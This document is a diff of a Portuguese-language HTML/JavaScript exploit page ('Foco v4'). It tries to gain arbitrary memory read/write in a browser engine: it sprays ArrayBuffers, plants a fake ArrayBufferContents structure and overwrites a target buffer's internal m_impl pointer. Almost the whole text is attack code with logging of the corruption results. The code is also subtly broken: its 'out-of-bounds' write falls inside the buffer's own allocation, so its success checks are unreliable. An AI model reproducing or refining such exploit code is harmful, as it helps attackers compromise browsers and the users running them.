@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Foco v3 Debug: Corrupção Ponteiro com Leak</title>
+    <title>Foco v4: Tentativa de R/W Arbitrária via Corrupção de m_impl</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
@@ -13,204 +13,232 @@
     </style>
 </head>
 <body>
-    <h1>Foco v3 Debug: Corrupção de Ponteiro Interno AB com Padrão Conhecido</h1>
-    <p>Tenta sobrescrever [obj_ptr+10h] com 0xAAAAAAAA_AAAAAAAA no offset crítico ctrlDataEnd+32.
-       Verifica se targetBuffer.byteLength muda para um valor grande.</p>
-    <button id="runBtn" onclick="runPointerCorruptionTest_v3()">Iniciar Teste v3 (Debug)</button>
+    <h1>Foco v4: Tentativa de R/W Arbitrária</h1>
+    <p>Corrompe [target_obj_ptr+10h] (m_impl) para apontar para uma estrutura ArrayBufferContents falsa.
+       Offset crítico para corromper m_impl: ctrlDataEnd+32.
+       O endereço da estrutura ArrayBufferContents falsa é o principal desafio.</p>
+    <label for="fakeImplPtrStrategy">Estratégia para Ponteiro m_impl Falso:</label>
+    <select id="fakeImplPtrStrategy">
+        <option value="AAAA">Usar 0xAAAAAAAA_AAAAAAAA (Leak Test)</option>
+        <option value="NULL">Usar 0x00000000_00000000 (Null Ptr Test)</option>
+        <option value="LOW_ADDR">Usar 0x00000000_00010000 (Low Address Test)</option>
+    </select>
+    <br><br>
+    <label for="fakeDataPtrLow">Endereço de Dados Falso (Low U32): 0x</label><input type="text" id="fakeDataPtrLow" value="00000000" size="8">
+    <label for="fakeDataPtrHigh">Endereço de Dados Falso (High U32): 0x</label><input type="text" id="fakeDataPtrHigh" value="00000000" size="8">
+    <br><br>
+    <button id="runBtn" onclick="runArbitraryRwTest_v4()">Iniciar Teste v4</button>
     <div id="output"></div>
 
-    <script>
-        const outputDiv = document.getElementById('output');
-        const runBtn = document.getElementById('runBtn');
-        const SHORT_PAUSE = 50;
+<script>
+    const outputDiv = document.getElementById('output');
+    const runBtn = document.getElementById('runBtn');
+    const fakeImplPtrStrategySelector = document.getElementById('fakeImplPtrStrategy');
+    const fakeDataPtrLowInput = document.getElementById('fakeDataPtrLow');
+    const fakeDataPtrHighInput = document.getElementById('fakeDataPtrHigh');
+    const SHORT_PAUSE = 50;
 
-        const log = (message, type = 'info', funcName = '') => {
-            if (!outputDiv) { console.log(`[${type.toUpperCase()}] ${funcName ? `[${funcName}] ` : ''}${message}`); return; }
+    const log = (message, type = 'info', funcName = '') => {
+        if (!outputDiv) { console.log(`[${type.toUpperCase()}] ${funcName ? `[${funcName}] ` : ''}${message}`); return; }
+        try {
+            const timestamp = `[${new Date().toLocaleTimeString([], { hour12: false })}]`;
+            const prefix = funcName ? `[${funcName}] ` : '';
+            const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+            const logClass = ['info', 'test', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
+            if (outputDiv.innerHTML.length > 1000000) { outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 500000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; }
+            outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
+            if (outputDiv.scrollTop + outputDiv.clientHeight >= outputDiv.scrollHeight - 20) { outputDiv.scrollTop = outputDiv.scrollHeight; }
+        } catch (e) { console.error("Erro ao logar:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString([], { hour12: false })}] [LOGGING ERROR] ${String(e)}\n`; }
+    };
+    const PAUSE = (ms = SHORT_PAUSE) => new Promise(resolve => setTimeout(resolve, ms));
+    const toHex = (val, bits = 32) => {
+        if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
+        let num = Number(val);
+        if (bits <= 32) { num = num >>> 0; }
+        const pad = Math.ceil(bits / 4);
+        return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
+    };
+    const toHex64 = (high, low) => `0x${(high>>>0).toString(16).toUpperCase().padStart(8, '0')}${(low>>>0).toString(16).toUpperCase().padStart(8, '0')}`;
+
+    const LEAKED_POINTER_BASE_HIGH = 0xAAAAAAAA;
+    const LEAKED_POINTER_BASE_LOW  = 0xAAAAAAAA;
+    const CRITICAL_OFFSET_TO_M_IMPL = 32; // Relativo ao fim dos dados (úteis) do controlBuffer
+    const OFFSET_CONTENTS_DATA_POINTER = 0x08; // Provável offset de m_data em ArrayBufferContents
+    const OFFSET_CONTENTS_SIZE = 0x10;         // Offset de m_size em ArrayBufferContents (confirmado)
+    const FAKE_CONTENTS_STRUCT_SIZE = 0x20;    // Tamanho para nossa estrutura ArrayBufferContents falsa
+
+    const attemptArbitraryRw_v4 = async () => {
+        const FNAME = 'attemptArbitraryRw_v4';
+        log(`--- Iniciando Teste v4: Tentativa de R/W Arbitrária ---`, 'test', FNAME);
+
+        const controlBufferSize = 64;
+        const targetBufferOriginalSize = 64;
+        const numSprayBuffers = 100;
+        const targetBuffers = [];
+        let arbRwPrimitiveAchieved = false;
+        let corruptedTargetBuffer = null;
+
+        // 1. Preparar nossa estrutura ArrayBufferContents falsa em um buffer JS
+        log("Preparando estrutura ArrayBufferContents falsa...", 'info', FNAME);
+        // Este buffer (fake_contents_holder_ab) conterá a *nossa* estrutura ArrayBufferContents.
+        const fake_contents_holder_ab = new ArrayBuffer(FAKE_CONTENTS_STRUCT_SIZE);
+        const dv_fake_contents = new DataView(fake_contents_holder_ab);
+
+        const fakeByteLength = 0x7FFFFFFE; // Nosso byteLength falso e grande
+        const desiredFakeDataPtrLow = parseInt(fakeDataPtrLowInput.value, 16) || 0;
+        const desiredFakeDataPtrHigh = parseInt(fakeDataPtrHighInput.value, 16) || 0;
+
+        // Escreve o ponteiro m_data falso na nossa estrutura (apontando para onde queremos ler/escrever)
+        dv_fake_contents.setUint32(OFFSET_CONTENTS_DATA_POINTER, desiredFakeDataPtrLow, true);
+        dv_fake_contents.setUint32(OFFSET_CONTENTS_DATA_POINTER + 4, desiredFakeDataPtrHigh, true);
+        // Escreve o m_size (byteLength) falso na nossa estrutura
+        dv_fake_contents.setUint32(OFFSET_CONTENTS_SIZE, fakeByteLength, true);
+
+        log(`Estrutura ArrayBufferContents falsa preparada em fake_contents_holder_ab:`, 'info', FNAME);
+        log(`  - fake_contents.m_data = ${toHex64(desiredFakeDataPtrHigh, desiredFakeDataPtrLow)} (offset ${toHex(OFFSET_CONTENTS_DATA_POINTER)})`, 'info', FNAME);
+        log(`  - fake_contents.m_size = ${toHex(fakeByteLength)} (offset ${toHex(OFFSET_CONTENTS_SIZE)})`, 'info', FNAME);
+
+        // Valor que será escrito no campo m_impl do targetBuffer.
+        // Este é o GRANDE DESAFIO: precisamos do endereço de memória de fake_contents_holder_ab.data.
+        let new_m_impl_val_high, new_m_impl_val_low;
+        const strategy = fakeImplPtrStrategySelector.value;
+
+        if (strategy === "AAAA") {
+            new_m_impl_val_high = LEAKED_POINTER_BASE_HIGH;
+            new_m_impl_val_low  = LEAKED_POINTER_BASE_LOW;
+            log(`Estratégia para novo m_impl: Usando LEAKED_POINTER_BASE ${toHex64(new_m_impl_val_high, new_m_impl_val_low)}`, 'warn', FNAME);
+        } else if (strategy === "NULL") {
+            new_m_impl_val_high = 0x0;
+            new_m_impl_val_low  = 0x0;
+            log(`Estratégia para novo m_impl: Usando Ponteiro NULO ${toHex64(new_m_impl_val_high, new_m_impl_val_low)}`, 'warn', FNAME);
+        } else { // LOW_ADDR
+            new_m_impl_val_high = 0x0;
+            new_m_impl_val_low  = 0x10000; // Um endereço baixo arbitrário
+             log(`Estratégia para novo m_impl: Usando Endereço Baixo ${toHex64(new_m_impl_val_high, new_m_impl_val_low)}`, 'warn', FNAME);
+        }
+        log("NOTA: Sem um 'addrof', o valor escrito para m_impl é especulativo!", 'critical', FNAME);
+
+
+        // 2. Alocar controlBuffer e targetBuffers
+        const allocationSizeControl = controlBufferSize + CRITICAL_OFFSET_TO_M_IMPL + 8 + 128;
+        let controlBuffer, controlDv;
+        try {
+            controlBuffer = new ArrayBuffer(allocationSizeControl);
+            controlDv = new DataView(controlBuffer);
+            for (let i = 0; i < controlBufferSize; i++) controlDv.setUint8(i, 0xBB);
+            for (let i = controlBufferSize; i < controlBuffer.byteLength; i++) controlDv.setUint8(i, 0xCC);
+            log(`Buffer de controle (${allocationSizeControl} bytes) alocado.`, 'info', FNAME);
+        } catch (e) {
+            log(`Erro FATAL ao alocar buffer de controle: ${e.message}`, 'error', FNAME); return;
+        }
+
+        log(`Alocando ${numSprayBuffers} buffers alvo/spray...`, 'info', FNAME);
+        for (let i = 0; i < numSprayBuffers; i++) {
+            try { targetBuffers.push(new ArrayBuffer(targetBufferOriginalSize)); }
+            catch (e) { log(`Erro ao alocar spray buffer ${i}: ${e.message}`, 'warn', FNAME); }
+        }
+        const target_array_buffer = targetBuffers[0];
+        if (!target_array_buffer) {
+            log("Falha ao alocar target_array_buffer. Abortando.", "error", FNAME); return;
+        }
+        log(`${targetBuffers.length} buffers alvo/spray alocados. Target principal: targetBuffers[0]`, 'info', FNAME);
+        await PAUSE(100);
+
+        // 3. Executar a Corrupção no m_impl do target_array_buffer
+        const oobWriteAddress = controlBufferSize + CRITICAL_OFFSET_TO_M_IMPL;
+        log(`Tentando escrita OOB U64 (novo m_impl: ${toHex64(new_m_impl_val_high, new_m_impl_val_low)}) em ctrlDataEnd+${CRITICAL_OFFSET_TO_M_IMPL} (abs ${oobWriteAddress})`, 'info', FNAME);
+
+        try {
+            controlDv.setUint32(oobWriteAddress, new_m_impl_val_low, true);
+            controlDv.setUint32(oobWriteAddress + 4, new_m_impl_val_high, true);
+            log(`Escrita OOB U64 parece OK. Verificando target_array_buffer.byteLength...`, 'info', FNAME);
+            await PAUSE(250);
+
+            const originalLength = targetBufferOriginalSize;
             try {
-                const timestamp = `[${new Date().toLocaleTimeString([], { hour12: false })}]`;
-                const prefix = funcName ? `[${funcName}] ` : '';
-                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                const logClass = ['info', 'test', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
-                if (outputDiv.innerHTML.length > 900000) { outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 450000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; }
-                outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
-                if (outputDiv.scrollTop + outputDiv.clientHeight >= outputDiv.scrollHeight - 20) { // Auto-scroll if near the bottom
-                    outputDiv.scrollTop = outputDiv.scrollHeight;
+                const newLength = target_array_buffer.byteLength;
+                log(`target_array_buffer.byteLength ANTES era ${originalLength}`, 'info', FNAME);
+                log(`target_array_buffer.byteLength AGORA é ${toHex(newLength)} (${newLength})`, newLength !== originalLength ? 'vuln' : 'info', FNAME);
+
+                if (newLength === fakeByteLength) {
+                    log(`!!! SUCESSO !!! byteLength do target_array_buffer é ${toHex(fakeByteLength)}!`, 'critical', FNAME);
+                    arbRwPrimitiveAchieved = true;
+                    corruptedTargetBuffer = target_array_buffer;
+                } else if (newLength !== originalLength && newLength > originalLength) {
+                    log(`AVISO: byteLength mudou para ${toHex(newLength)}, mas não para o fakeByteLength esperado (${toHex(fakeByteLength)}).`, 'warn', FNAME);
+                    if (newLength > originalLength + 0x1000 && newLength < 0xFFFFFFF0) { // Se for grande e não um erro óbvio
+                        arbRwPrimitiveAchieved = true; corruptedTargetBuffer = target_array_buffer;
+                        log(`   Considerando sucesso parcial de R/W ampliada.`, 'vuln', FNAME);
+                    }
+                } else if (newLength === originalLength) {
+                    log(`INFO: byteLength permaneceu ${originalLength}. Nenhuma mudança.`, 'info', FNAME);
                 }
-            } catch (e) { console.error("Erro ao logar:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString([], { hour12: false })}] [LOGGING ERROR] ${String(e)}\n`; }
-        };
-        const PAUSE = (ms = SHORT_PAUSE) => new Promise(resolve => setTimeout(resolve, ms));
-        const toHex = (val, bits = 32) => {
-            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
-            let num = Number(val);
-            if (bits <= 32) { num = num >>> 0; }
-            const pad = Math.ceil(bits / 4);
-            return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
-        };
-        const toHex64 = (high, low) => `0x${(high>>>0).toString(16).toUpperCase().padStart(8, '0')}${(low>>>0).toString(16).toUpperCase().padStart(8, '0')}`;
-
-        // Suposição baseada nos seus logs do Teste 2 (OOB Read Pointer Leak)
-        const LEAKED_POINTER_HIGH = 0xAAAAAAAA;
-        const LEAKED_POINTER_LOW  = 0xAAAAAAAA;
-
-        // O offset que causou o crash no teste anterior (v2)
-        const CRITICAL_TOTAL_OFFSET = 32; // Este é ctrlDataEnd + X
-
-        const attemptPointerCorruption_v3 = async () => {
-            // alert("DEBUG: attemptPointerCorruption_v3 CALLED!"); // Debug Alert 2
-            const FNAME = 'attemptPointerCorruption_v3';
-            log(`--- Iniciando Teste v3: Corrupção [obj_ptr+10h] com ${toHex64(LEAKED_POINTER_HIGH, LEAKED_POINTER_LOW)} ---`, 'test', FNAME);
-
-            const controlBufferSize = 64; // Tamanho útil
-            const targetBufferOriginalSize = 64;
-            const numTargetBuffers = 20;
-            const targetBuffers = [];
-
-            // allocationSizeControl precisa ser: parte_util + offset_critico + 8_bytes_para_escrita_U64 + um_pouco_de_folga
-            const allocationSizeControl = controlBufferSize + CRITICAL_TOTAL_OFFSET + 8 + 64;
-            let controlBuffer, controlDv;
-
-            try {
-                log("DEBUG: Antes de alocar controlBuffer.", 'info', FNAME);
-                controlBuffer = new ArrayBuffer(allocationSizeControl);
-                controlDv = new DataView(controlBuffer);
-                for (let i = 0; i < controlBufferSize; i++) controlDv.setUint8(i, 0xBB); // Parte útil
-                for (let i = controlBufferSize; i < controlBuffer.byteLength; i++) controlDv.setUint8(i, 0xCC); // Parte OOB
-                log(`Buffer de controle (${allocationSizeControl} bytes) alocado. Útil: ${controlBufferSize} bytes.`, 'info', FNAME);
-            } catch (e) {
-                log(`Erro FATAL ao alocar buffer de controle: ${e.message}`, 'error', FNAME);
-                alert(`Erro FATAL ao alocar controlBuffer: ${e.message}`);
-                return;
+            } catch (eAccess) {
+                log(`!!! CRASH/ERRO AO ACESSAR byteLength do target_array_buffer após corrupção!!!`, 'critical', FNAME);
+                log(`   Erro: ${eAccess.message || "Erro desconhecido (provável crash)"}`, 'vuln', FNAME);
+                // Se crashar aqui, é porque o new_m_impl_val que escrevemos não é um ponteiro válido
+                // para uma estrutura que possa ser lida para obter o byteLength.
             }
+        } catch (eWrite) {
+            log(`Escrita OOB U64 FALHOU/Bloqueada: ${eWrite.message}`, 'error', FNAME);
+        }
 
-            log(`Alocando ${numTargetBuffers} buffers alvo de ${targetBufferOriginalSize} bytes...`, 'info', FNAME);
+        // 4. Testar Leitura/Escrita se a primitiva foi alcançada
+        if (arbRwPrimitiveAchieved && corruptedTargetBuffer) {
+            log(`--- Tentando Leitura/Escrita com target_array_buffer (novo tamanho ${toHex(corruptedTargetBuffer.byteLength)}) ---`, 'test', FNAME);
+            log(`--- Usando ponteiro de dados configurado na estrutura falsa: ${toHex64(desiredFakeDataPtrHigh, desiredFakeDataPtrLow)} ---`, 'test', FNAME);
             try {
-                for (let i = 0; i < numTargetBuffers; i++) {
-                    targetBuffers.push(new ArrayBuffer(targetBufferOriginalSize));
-                }
-                log(`${targetBuffers.length} buffers alvo alocados.`, 'info', FNAME);
-            } catch (e) {
-                log(`Erro ao alocar buffers alvo: ${e.message}`, 'warn', FNAME);
-                 // Continuar mesmo se alguns falharem, desde que pelo menos um (targetBuffers[0]) funcione
-            }
+                const dvCorrupted = new DataView(corruptedTargetBuffer);
+                // Os offsets aqui são relativos ao desiredFakeDataPtrHigh/Low
+                const readWriteOffset1 = 0x0;
+                const readWriteOffset2 = 0x80;
+                const testPattern1 = 0xCAFEBABE;
+                const testPattern2 = 0x12345678;
 
-            await PAUSE(100);
+                log(`Escrevendo ${toHex(testPattern1)} em offset ${toHex(readWriteOffset1)} (relativo ao fakeDataPtr)...`, 'info', FNAME);
+                dvCorrupted.setUint32(readWriteOffset1, testPattern1, true);
+                let readValue1 = dvCorrupted.getUint32(readWriteOffset1, true);
+                log(`Lido de volta de ${toHex(readWriteOffset1)}: ${toHex(readValue1)}`, 'info', FNAME);
 
-            let corruptionSuccess = false;
-            let successInfo = "";
+                if (readValue1 === testPattern1) {
+                    log(`LEITURA/ESCRITA (pattern 1) no endereço ${toHex64(desiredFakeDataPtrHigh, desiredFakeDataPtrLow)}+${toHex(readWriteOffset1)} CONFIRMADA!`, 'escalation', FNAME);
 
-            // O endereço de escrita é relativo ao início físico do controlBuffer.
-            // baseOOBWriteOffset é o início da área OOB, logo após a parte útil.
-            const baseOOBWriteOffset = controlBufferSize;
-            const oobWriteAddress = baseOOBWriteOffset + CRITICAL_TOTAL_OFFSET;
-
-            log(`Alvo da escrita OOB U64: ${toHex64(LEAKED_POINTER_HIGH, LEAKED_POINTER_LOW)}`, 'info', FNAME);
-            log(`   em ctrlDataEnd+${CRITICAL_TOTAL_OFFSET} (abs. no controlBuffer: ${oobWriteAddress})`, 'info', FNAME);
-
-            try {
-                if ((oobWriteAddress + 8) > controlBuffer.byteLength) {
-                    log(`ERRO FATAL: oobWriteAddress ${oobWriteAddress} + 8 está fora do controlBuffer.byteLength ${controlBuffer.byteLength}. Verifique allocationSizeControl.`, 'error', FNAME);
-                    alert("Erro de cálculo de offset no script!");
-                    return;
-                }
-                controlDv.setUint32(oobWriteAddress, LEAKED_POINTER_LOW, true);
-                controlDv.setUint32(oobWriteAddress + 4, LEAKED_POINTER_HIGH, true);
-                log(`Escrita OOB U64 no offset ${CRITICAL_TOTAL_OFFSET} (relativo a ctrlDataEnd) parece OK. Verificando targetBuffers[0].byteLength...`, 'info', FNAME);
-
-                await PAUSE(250); // Pausa um pouco mais longa para dar tempo de qualquer efeito se manifestar
-
-                const target = targetBuffers[0];
-                if (target) {
-                    const originalLength = targetBufferOriginalSize; // Assumindo que foi alocado com sucesso
-                    log(`Verificando .byteLength de targetBuffers[0] (originalmente ${originalLength})...`, 'info', FNAME);
-                    try {
-                        const newLength = target.byteLength;
-                        log(`targetBuffers[0].byteLength APÓS tentativa de corrupção é ${toHex(newLength)} (${newLength})`, newLength !== originalLength ? 'vuln' : 'info', FNAME);
-
-                        if (newLength !== originalLength && newLength > (originalLength + 0x1000) && newLength < 0xFFFFFFFF) { // Heurística para "grande e razoável"
-                            log(`!!! SUCESSO !!! byteLength do targetBuffers[0] mudou para um valor grande!`, 'critical', FNAME);
-                            log(`   Offset usado (relativo a ctrlDataEnd): ${CRITICAL_TOTAL_OFFSET}`, 'critical', FNAME);
-                            log(`   Ponteiro escrito: ${toHex64(LEAKED_POINTER_HIGH, LEAKED_POINTER_LOW)}`, 'critical', FNAME);
-                            log(`   Novo byteLength: ${toHex(newLength)} (${newLength})`, 'critical', FNAME);
-                            corruptionSuccess = true;
-                            successInfo = `Buffer 0, Offset ${CRITICAL_TOTAL_OFFSET}, Novo Tamanho ${toHex(newLength)}`;
-
-                            const corruptedView = new DataView(target);
-                            const readAddr = originalLength + Math.floor(Math.random() * 0x80) + 0x10; // Ler um pouco além
-                            const writeAddr = originalLength + Math.floor(Math.random() * 0x80) + 0x90; // Escrever um pouco além
-                            const testPattern = 0xBADCAFED;
-
-                            if (readAddr < newLength - 4) {
-                                log(`Tentando leitura em ${toHex(readAddr)} no buffer corrompido (novo tamanho ${toHex(newLength)})...`, 'info', FNAME);
-                                let val = corruptedView.getUint32(readAddr, true);
-                                log(` -> LIDO do buffer corrompido @${toHex(readAddr)}: ${toHex(val)}`, 'leak', FNAME);
-                            } else {
-                                log(`WARN: readAddr ${toHex(readAddr)} fora do novo tamanho ${toHex(newLength)}. Teste de leitura pulado.`, 'warn', FNAME);
-                            }
-
-                            if (writeAddr < newLength - 4) {
-                                log(`Tentando escrita de ${toHex(testPattern)} em ${toHex(writeAddr)} no buffer corrompido...`, 'info', FNAME);
-                                corruptedView.setUint32(writeAddr, testPattern, true);
-                                let val_escrita = corruptedView.getUint32(writeAddr, true);
-                                if (val_escrita === testPattern) {
-                                    log(` ---> SUCESSO NA ESCRITA/LEITURA AMPLIADA! Leu ${toHex(val_escrita)} de volta.`, 'escalation', FNAME);
-                                } else {
-                                    log(` ---> FALHA na verificação da escrita ampliada. Leu ${toHex(val_escrita)} em vez de ${toHex(testPattern)}.`, 'warn', FNAME);
-                                }
-                            } else {
-                                log(`WARN: writeAddr ${toHex(writeAddr)} fora do novo tamanho ${toHex(newLength)}. Teste de escrita pulado.`, 'warn', FNAME);
-                            }
-
-                        } else if (newLength !== originalLength) {
-                            log(`AVISO: byteLength mudou para ${toHex(newLength)}, mas não para um valor significativamente grande ou esperado.`, 'warn', FNAME);
-                            successInfo = `Buffer 0, Offset ${CRITICAL_TOTAL_OFFSET}, Novo Tamanho ${toHex(newLength)} (não ideal)`;
-                            corruptionSuccess = true; // Ainda é uma mudança
-                        } else {
-                             log(`INFO: byteLength de targetBuffers[0] permaneceu ${originalLength}. Nenhuma mudança detectada.`, 'info', FNAME);
-                        }
-                    } catch (eAccess) {
-                        log(`!!! CRASH/ERRO AO ACESSAR byteLength do targetBuffers[0] após corrupção!!!`, 'critical', FNAME);
-                        log(`   Offset usado (relativo a ctrlDataEnd): ${CRITICAL_TOTAL_OFFSET}`, 'critical', FNAME);
-                        log(`   Ponteiro escrito: ${toHex64(LEAKED_POINTER_HIGH, LEAKED_POINTER_LOW)}`, 'critical', FNAME);
-                        log(`   Erro: ${eAccess.message || "Erro desconhecido (provável crash)"}`, 'vuln', FNAME);
-                        corruptionSuccess = true;
-                        successInfo = `Buffer 0, Offset ${CRITICAL_TOTAL_OFFSET}, CRASH ao acessar byteLength`;
+                    log(`Escrevendo ${toHex(testPattern2)} em offset ${toHex(readWriteOffset2)} (relativo ao fakeDataPtr)...`, 'info', FNAME);
+                    dvCorrupted.setUint32(readWriteOffset2, testPattern2, true);
+                    let readValue2 = dvCorrupted.getUint32(readWriteOffset2, true);
+                    log(`Lido de volta de ${toHex(readWriteOffset2)}: ${toHex(readValue2)}`, 'info', FNAME);
+                    if (readValue2 === testPattern2) {
+                        log(`LEITURA/ESCRITA (pattern 2) no endereço ${toHex64(desiredFakeDataPtrHigh, desiredFakeDataPtrLow)}+${toHex(readWriteOffset2)} CONFIRMADA!`, 'escalation', FNAME);
+                        alert("Primitive R/W Arbitrária ALCANÇADA!\nVerifique os logs para os endereços de leitura/escrita.");
+                    } else {
+                         log(`Falha na segunda verificação de R/W. Esperava ${toHex(testPattern2)}, leu ${toHex(readValue2)}.`, 'warn', FNAME);
                     }
                 } else {
-                    log("targetBuffers[0] não foi alocado ou não está disponível.", "error", FNAME);
+                    log(`Falha na primeira verificação de R/W. Esperava ${toHex(testPattern1)}, leu ${toHex(readValue1)}.`, 'error', FNAME);
+                    alert("Falha ao confirmar R/W Arbitrária. O ponteiro de dados da estrutura falsa pode não ser válido/acessível.");
                 }
-            } catch (eWrite) {
-                log(`Escrita OOB U64 (relativa a ctrlDataEnd+${CRITICAL_TOTAL_OFFSET}) FALHOU/Bloqueada: ${eWrite.message}`, 'error', FNAME);
+            } catch (eRW) {
+                log(`Erro durante o teste de R/W com buffer corrompido: ${eRW.message}`, 'error', FNAME);
+                alert("Erro durante o teste de R/W com buffer corrompido. Verifique os logs.");
             }
+        } else {
+             log("--- Nenhuma primitiva de R/W ampliada alcançada (byteLength não correspondeu ao esperado ou houve crash). ---", 'test', FNAME);
+        }
 
-            if (corruptionSuccess) {
-                log(`--- RESULTADO DO TESTE v3: ${successInfo} ---`, 'test', FNAME);
-                alert(`RESULTADO DO TESTE v3:\n${successInfo}\nVerifique os logs para detalhes.`);
-            } else {
-                log("--- Nenhuma evidência de corrupção (crash ou alteração significativa de byteLength) detectada com o offset crítico. ---", 'test', FNAME);
-                alert("Nenhuma evidência de corrupção detectada com o offset crítico. Verifique os logs.");
-            }
-        };
+        log("\n==== Teste v4 Concluído ====", 'test', FNAME);
+        if (runBtn) runBtn.disabled = false;
+    };
 
-        const runPointerCorruptionTest_v3 = async () => {
-            // alert("DEBUG: runPointerCorruptionTest_v3 CALLED!"); // Debug Alert 1
-            if (runBtn) runBtn.disabled = true;
-            outputDiv.innerHTML = ''; // Limpa logs anteriores
-            log("==== INICIANDO TESTE v3 (Debug) DE CORRUPÇÃO DE PONTEIRO INTERNO ====", 'test', 'Main');
-            try {
-                await attemptPointerCorruption_v3();
-            } catch (eOuter) {
-                log(`ERRO INESPERADO NO FLUXO PRINCIPAL do teste v3: ${eOuter.message}`, 'critical', 'Main');
-                if (eOuter.stack) log(eOuter.stack, 'critical', 'Main');
-                alert(`ERRO CRÍTICO no script v3: ${eOuter.message}`);
-            }
-            log("\n==== TESTE v3 (Debug) DE CORRUPÇÃO DE PONTEIRO CONCLUÍDO ====", 'test', 'Main');
-            if (runBtn) runBtn.disabled = false;
-        };
-
-        // Adiciona um log inicial para garantir que o script base foi carregado
-        log("Script Foco v3 (Debug) carregado e pronto.", "info", "Global");
-        alert("Script Foco v3 (Debug) CARREGADO. Clique no botão para iniciar.");
-
-    </script>
+    const runArbitraryRwTest_v4 = async () => {
+        if (runBtn) runBtn.disabled = true;
+        outputDiv.innerHTML = '';
+        log("==== INICIANDO TESTE v4 DE TENTATIVA DE R/W ARBITRÁRIA ====", 'test', 'Main');
+        await attemptArbitraryRw_v4();
+        log("\n==== TESTE v4 DE TENTATIVA DE R/W ARBITRÁRIA CONCLUÍDO ====", 'test', 'Main');
+        if (runBtn) runBtn.disabled = false;
+    };
+    log("Script Foco v4 carregado e pronto.", "info", "Global");
+    alert("Script Foco v4 CARREGADO. Configure os ponteiros falsos se desejar e clique no botão para iniciar.");
+</script>
 </body>
 </html>
